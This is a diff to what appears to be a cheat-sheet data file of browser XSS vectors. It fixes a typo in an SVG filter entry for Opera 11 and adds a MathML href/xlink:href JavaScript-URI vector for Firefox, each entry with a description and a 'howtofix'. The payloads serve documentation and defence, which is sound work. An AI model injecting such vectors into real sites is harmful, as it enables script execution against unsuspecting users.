@@ -4504,7 +4504,7 @@ var items =
         },
         'data'      : '<svg>\n<image style=\'filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.%js_alert%</script></svg>")\'>\n<!--\nSame effect with\n<image filter=\'...\'>\n-->\n</svg>',
         'description' : {
-            'en'    : 'Additonal to script execution via "xlink:href" in SVG elements such as <image>, <animation>, <foreignObject> listed in #109, Opera 11 allows to utilize filters to accomplish the same. Note that either the <em>filter</em> attribute, as well as the CSS property <code>filter</code> can be used in this case. Both <em>style</em> and <em>filter</em> attributes in inline SVG should be considered unsafe.',
+            'en'    : 'Additional to script execution via "xlink:href" in SVG elements such as <image>, <animation>, <foreignObject> listed in #109, Opera 11 allows to utilize filters to accomplish the same. Note that either the <em>filter</em> attribute, as well as the CSS property <code>filter</code> can be used in this case. Both <em>style</em> and <em>filter</em> attributes in inline SVG should be considered unsafe.',
             'ja'    : '',
             'ru'    : 'Вместо атрибута "xlink:href" для запуска скриптов в SVG-тегах <image>, <animation>, <foreignObject> могут быть использованы стилевые свойства, перечисленные в #109.',
             'cs'    : '',
@@ -4525,8 +4525,40 @@ var items =
         },
         'tags'      : [ 'svg', 'xss', 'inline', 'opera', 'css', 'style'],
         'reporter'  : 'LeverOne'
+    },
+    { /* ID 130 - Passive JavaScript execution via MathML on Firefox  */
+        'id'        : 130,
+        'category'  : 'html5',
+        'name'      : {
+            'en'    : 'Passive JavaScript execution via MathML on Firefox',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'data'      : '<math href="%js_uri_alert%">CLICKME</math>\r\n<math xlink:href="%js_uri_alert%">CLICKME</math>',
+        'description' : {
+            'en'    : 'Modern Firefox versions allow usage of inline MathML. While other user agents don\'t support the <em>href</em> attribute for MathML elements, Firefox does and thereby enables passive JavaScript execution. Note that supporting <em>href</em> for MathML elements is a feature - introduced with MathML 3. The same effect can be observed by using <em>xlink:href</em>.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'urls'      : ['http://www.w3.org/Math/', 'https://bugzilla.mozilla.org/show_bug.cgi?id=534968'],
+        'howtofix'  : {
+            'en'    : 'Do not allow users to submit unfiltered MathML content.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'browsers'  : {
+            'firefox': ['6', '7', '8', '9', '10', '11']
+        },
+        'tags'      : [ 'mathml', 'xss', 'inline', 'firefox'],
+        'reporter'  : '.mario'
     }
-
-
-    
 ]
